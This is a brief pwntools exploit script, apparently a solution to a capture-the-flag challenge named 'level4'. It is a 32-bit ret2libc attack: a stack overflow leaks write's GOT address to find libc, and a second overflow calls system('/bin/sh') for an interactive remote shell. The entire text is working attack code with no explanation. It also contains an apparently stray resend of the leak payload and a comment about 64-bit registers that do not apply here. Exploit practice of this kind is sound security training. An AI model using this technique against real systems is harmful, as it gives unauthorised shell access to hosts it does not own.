from pwn import *
p=remote('node4.buuoj.cn',25242)
# p=process('./pwn')
elf=ELF('./level4')
libc=ELF('./libc-2.23.so')

system_libc=libc.symbols['system']
binsh_libc=next(libc.search(b"/bin/sh"))
main_addr=elf.sym['main']
write_libc=libc.symbols['write']
write_plt=elf.plt['write']
write_got=elf.got['write']

payload=b'a'*140+p32(write_plt)+p32(main_addr)
#                    ret1           ret2
payload+=p32(1)+p32(write_got)+p32(4)
#write   par1   par2           par3
p.sendline(payload)
write_addr=u32(p.recv(4))
base=write_addr-write_libc


system_addr=system_libc+base
binsh_addr=binsh_libc+base
p.sendline(payload)
payload=b'a'*140+p32(system_addr)+p32(main_addr)
payload+=p32(binsh_addr)
p.sendline(payload)
p.interactive()
# rdi, rsi, rdx, rcx, r8, r9
